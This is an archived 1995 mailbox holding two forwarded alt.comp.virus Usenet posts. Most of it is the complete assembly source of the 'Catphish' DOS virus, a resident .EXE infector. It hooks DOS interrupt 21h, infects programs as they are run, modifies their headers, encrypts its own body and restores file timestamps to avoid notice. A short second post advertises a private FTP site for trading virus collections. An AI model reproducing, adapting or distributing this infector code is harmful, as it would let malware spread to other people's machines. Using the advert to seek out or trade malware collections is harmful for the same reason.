From smtp Sun Jan 29 16:25 EST 1995
Received: from ids.net by POBOX.jwu.edu; Sun, 29 Jan 95 16:25 EST
Date: Sun, 29 Jan 1995 16:18:52 -0500 (EST)
From: ids.net!JOSHUAW (JOSHUAW)
To: pobox.jwu.edu!joshuaw 
Content-Length: 11874
Content-Type: text
Message-Id: <950129161852.10074@ids.net>
Status: RO

To: joshuaw@pobox.jwu.edu
Subject: (fwd) CATPHISH.ASM
Newsgroups: alt.comp.virus

Path: paperboy.ids.net!uunet!cs.utexas.edu!uwm.edu!msunews!news.mtu.edu!news.mtu.edu!not-for-mail
From: jdmathew@mtu.edu (Icepick)
Newsgroups: alt.comp.virus
Subject: CATPHISH.ASM
Date: 26 Jan 1995 13:06:15 -0500
Organization: Michigan Technological University
Lines: 486
Message-ID: <3g8oan$54g@maxwell11.ee>
NNTP-Posting-Host: maxwell11.ee.mtu.edu
X-Newsreader: TIN [version 1.2 PL1]



name    VIRUSTEST
        title
code    segment
        assume  cs:code, ds:code, es:code
        org     100h

;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;                        The Catphish Virus.
;
;   The Catphish virus is a resident .EXE infector.
;                Size: 678 bytes (decimal).
;                No activation (bomb).
;                Saves date and file attributes.
;
;         If assembling, check_if_resident jump must be marked over
;           with nop after first execution (first execution will hang
;           system).
;
;         *** Source is made available to learn from, not to
;               change author's name and claim credit! ***

start:
        call    setup                             ; Find "delta offset".
setup:
        pop     bp
        sub     bp, offset setup-100h
        jmp     check_if_resident                 ; See note above about jmp!

pre_dec_em:
        mov bx,offset infect_header-100h
        add bx,bp
        mov cx,endcrypt-infect_header

ror_em:
        mov dl,byte ptr cs:[bx]
        ror dl,1                                  ; Decrypt virus code
        mov byte ptr cs:[bx],dl                   ;   by rotating right.
        inc bx
        loop ror_em

        jmp check_if_resident

;--------------------------------- Infect .EXE header -----------------------
;   The .EXE header modifying code below is my reworked version of
;     Dark Angel's code found in his Phalcon/Skism virus guides.


infect_header:
          push bx
          push dx
          push ax



          mov     bx, word ptr [buffer+8-100h]    ; Header size in paragraphs
               ;  ^---make sure you don't destroy the file handle
          mov     cl, 4                           ; Multiply by 16.  Won't
          shl     bx, cl                          ; work with headers > 4096
                                                  ; bytes.  Oh well!
          sub     ax, bx                          ; Subtract header size from
          sbb     dx, 0                           ; file size
    ; Now DX:AX is loaded with file size minus header size
          mov     cx, 10h                         ; DX:AX/CX = AX Remainder DX
          div     cx


          mov     word ptr [buffer+14h-100h], dx  ; IP Offset
          mov     word ptr [buffer+16h-100h], ax  ; CS Displacement in module


          mov     word ptr [buffer+0Eh-100h], ax     ; Paragraph disp. SS
          mov     word ptr [buffer+10h-100h], 0A000h ; Starting SP

          pop ax
          pop dx

          add ax, endcode-start                   ; add virus size
          cmp ax, endcode-start
          jb fix_fault
          jmp execont


war_cry  db 'Cry Havoc, and let slip the Dogs of War!',0
v_name   db '[Catphish]',0                        ; Virus name.
v_author db 'FirstStrike',0                       ; Me.
v_stuff  db 'Kraft!',0


fix_fault:
          add dx,1d

execont:
          push ax
          mov cl, 9
          shr ax, cl
          ror dx, cl
          stc

          adc dx, ax
          pop ax
          and ah, 1


          mov word ptr [buffer+4-100h], dx        ; Fix-up the file size in
          mov word ptr [buffer+2-100h], ax        ; the EXE header.

          pop bx
          retn                                    ; Leave subroutine

;----------------------------------------------------------------------------


check_if_resident:
        push es
        xor ax,ax
        mov es,ax

        cmp word ptr es:[63h*4],0040h             ; Check to see if virus
        jnz grab_da_vectors                       ;   is already resident
        jmp exit_normal                           ;   by looking for a 40h
                                                  ;   signature in the int 63h
                                                  ;   offset section of
                                                  ;   interrupt table.

grab_da_vectors:

        mov ax,3521h                              ; Store original int 21h
        int 21h                                   ;   vector pointer.
        mov word ptr cs:[bp+dos_vector-100h],bx
        mov word ptr cs:[bp+dos_vector+2-100h],es



load_high:
        push ds

find_chain:                                       ; Load high routine that
                                                  ;   uses the DOS internal
     mov ah,52h                                   ;   table function to find
     int 21h                                      ;   start of MCB and then
                                                  ;   scales up chain to
     mov ds,es: word ptr [bx-2]                   ;   find top. (The code
     assume ds:nothing                            ;   is long, but it is the
                                                  ;   only code that would
     xor si,si                                    ;   work when an infected
                                                  ;   .EXE was to be loaded
Middle_check:                                     ;   into memory.

     cmp byte ptr ds:[0],'M'
     jne Check4last

add_one:
     mov ax,ds
     add ax,ds:[3]
     inc ax

     mov ds,ax
     jmp Middle_check

Check4last:
     cmp byte ptr ds:[0],'Z'
     jne Error
     mov byte ptr ds:[0],'M'
     sub word ptr ds:[3],(endcode-start+15h)/16h+1
     jmp add_one

error:
     mov byte ptr ds:[0],'Z'
     mov word ptr ds:[1],008h
     mov word ptr ds:[3],(endcode-start+15h)/16h+1

     push ds
     pop ax
     inc ax
     push ax
     pop es





move_virus_loop:
        mov bx,offset start-100h                  ; Move virus into carved
        add bx,bp                                 ;   out location in memory.
        mov cx,endcode-start
        push bp
        mov bp,0000h

move_it:
        mov dl, byte ptr cs:[bx]
        mov byte ptr es:[bp],dl
        inc bp
        inc bx
        loop move_it
        pop bp



hook_vectors:

        mov ax,2563h                              ; Hook the int 21h vector
        mov dx,0040h                              ;   which means it will
        int 21h                                   ;   point to virus code in
                                                  ;   memory.
        mov ax,2521h
        mov dx,offset virus_attack-100h
        push es
        pop ds
        int 21h




        pop ds



exit_normal:                                      ; Return control to
        pop es                                    ;   infected .EXE
        mov ax, es                                ;   (Dark Angle code.)
        add ax, 10h
        add word ptr cs:[bp+OrigCSIP+2-100h], ax

        cli
        add ax, word ptr cs:[bp+OrigSSSP+2-100h]
        mov ss, ax
        mov sp, word ptr cs:[bp+OrigSSSP-100h]
        sti

        xor ax,ax
        xor bp,bp

endcrypt  label  byte

        db 0eah
OrigCSIP dd 0fff00000h
OrigSSSP dd ?

exe_attrib dw ?
date_stamp dw ?
time_stamp dw ?



dos_vector dd ?

buffer db 18h dup(?)                              ; .EXE header buffer.




;----------------------------------------------------------------------------


virus_attack proc  far
               assume cs:code,ds:nothing, es:nothing


        cmp ax,4b00h                              ; Infect only on file
        jz run_kill                               ;   executions.

leave_virus:
        jmp dword ptr cs:[dos_vector-100h]



run_kill:
        call infectexe
        jmp leave_virus





infectexe:                                        ; Same old working horse
        push ax                                   ;   routine that infects
        push bx                                   ;   the selected file.
        push cx
        push es
        push dx
        push ds



        mov cx,64d
        mov bx,dx

findname:
        cmp byte ptr ds:[bx],'.'
        jz o_k
        inc bx
        loop findname

pre_get_out:
        jmp get_out

o_k:
        cmp byte ptr ds:[bx+1],'E'                ; Searches for victims.
        jnz pre_get_out
        cmp byte ptr ds:[bx+2],'X'
        jnz pre_get_out
        cmp byte ptr ds:[bx+3],'E'
        jnz pre_get_out




getexe:
        mov ax,4300h
        call dosit

        mov word ptr cs:[exe_attrib-100h],cx

        mov ax,4301h
        xor cx,cx
        call dosit

exe_kill:
        mov ax,3d02h
        call dosit
        xchg bx,ax

        mov ax,5700h
        call dosit

        mov word ptr cs:[time_stamp-100h],cx
        mov word ptr cs:[date_stamp-100h],dx



        push cs
        pop ds

        mov ah,3fh
        mov cx,18h
        mov dx,offset buffer-100h
        call dosit

        cmp word ptr cs:[buffer+12h-100h],1993h   ; Looks for virus marker
        jnz infectforsure                         ;   of 1993h in .EXE
        jmp close_it                              ;   header checksum
                                                  ;   position.
infectforsure:
        call move_f_ptrfar

        push ax
        push dx


        call store_header

        pop dx
        pop ax

        call infect_header


        push bx
        push cx
        push dx


        mov bx,offset infect_header-100h
        mov cx,(endcrypt)-(infect_header)

rol_em:                                           ; Encryption via
        mov dl,byte ptr cs:[bx]                   ;   rotating left.
        rol dl,1
        mov byte ptr cs:[bx],dl
        inc bx
        loop rol_em

        pop dx
        pop cx
        pop bx

        mov ah,40h
        mov cx,endcode-start
        mov dx,offset start-100h
        call dosit


        mov word ptr cs:[buffer+12h-100h],1993h


        call move_f_ptrclose

        mov ah,40h
        mov cx,18h
        mov dx,offset buffer-100h
        call dosit

        mov ax,5701h
        mov cx,word ptr cs:[time_stamp-100h]
        mov dx,word ptr cs:[date_stamp-100h]
        call dosit

close_it:


        mov ah,3eh
        call dosit

get_out:


        pop ds
        pop dx

set_attrib:
        mov ax,4301h
        mov cx,word ptr cs:[exe_attrib-100h]
        call dosit


        pop es
        pop cx
        pop bx
        pop ax

        retn

;---------------------------------- Call to DOS int 21h ---------------------

dosit:                                            ; DOS function call code.
        pushf
        call dword ptr cs:[dos_vector-100h]
        retn

;----------------------------------------------------------------------------










;-------------------------------- Store Header -----------------------------

store_header:
        les  ax, dword ptr [buffer+14h-100h]      ; Save old entry point
        mov  word ptr [OrigCSIP-100h], ax
        mov  word ptr [OrigCSIP+2-100h], es

        les  ax, dword ptr [buffer+0Eh-100h]      ; Save old stack
        mov  word ptr [OrigSSSP-100h], es
        mov  word ptr [OrigSSSP+2-100h], ax

        retn

;---------------------------------------------------------------------------






;---------------------------------- Set file pointer ------------------------

move_f_ptrfar:                                    ; Code to move file pointer.
        mov ax,4202h
        jmp short move_f

move_f_ptrclose:
        mov ax,4200h

move_f:
        xor dx,dx
        xor cx,cx
        call dosit
        retn

;----------------------------------------------------------------------------


endcode         label       byte

endp

code ends
end  start

From smtp Fri Jan 27 13:23 EST 1995
Received: from ids.net by POBOX.jwu.edu; Fri, 27 Jan 95 13:23 EST
Date: Fri, 27 Jan 1995 13:21:38 -0500 (EST)
From: ids.net!JOSHUAW (JOSHUAW)
To: pobox.jwu.edu!joshuaw 
Content-Length: 1179
Content-Type: binary
Message-Id: <950127132138.b52b@ids.net>
Status: RO

To: joshuaw@pobox.jwu.edu
Subject: (fwd) Private Virii FTP Site
Newsgroups: alt.comp.virus

Path: paperboy.ids.net!uunet!nntp.crl.com!crl12.crl.com!not-for-mail
From: yojimbo@crl.com (Douglas Mauldin)
Newsgroups: alt.comp.virus
Subject: Private Virii FTP Site
Date: 24 Jan 1995 22:01:53 -0800
Organization: CRL Dialup Internet Access	(415) 705-6060  [Login: guest]
Lines: 14
Message-ID: <3g4pgh$ka2@crl12.crl.com>
NNTP-Posting-Host: crl12.crl.com
X-Newsreader: TIN [version 1.2 PL2]

I run THe QUaRaNTiNE, a private FTP site for viral reseachers/coders. I'm 
always on the lookout for new viral material. If you'd like access, or 
like to trade, email me a list of your collection. 

Serious inquiries only. 

       Ú ùùÄÄÄùÄ  ÄÄ-ÄùúÄÄÄÄÄ- - ÄÄÄÄÄùÂúÄÄÄÄ-- ÄÄÄÄùùÄ- ÄÄ-ÄùúÄÄú
       ³  Yojimbo [íØëæí]              ù Fast as the Wind        ù
       ù  SysOp: The Dojo BBS          ù Quiet as the Forest     ³
       ³  1.7i3.436.1795               ³ Aggressive as Fire      ú
       ú  QUaRaNTiNE HomeSite          ú And                     ³
       ³  THe ULTiMaTE ViRaL InFeCTiON ³ Immovable as a Mountain ³
        ùÄ -ÄùùúÄÄÄÄÄÄÄÄÄùùúÄÄÄÄ ÄÄúÄÄ úÄÄÄÄÄÄÄúù-ÄÄÄÄÄÄÄÄÄùúÄÄÄÄ


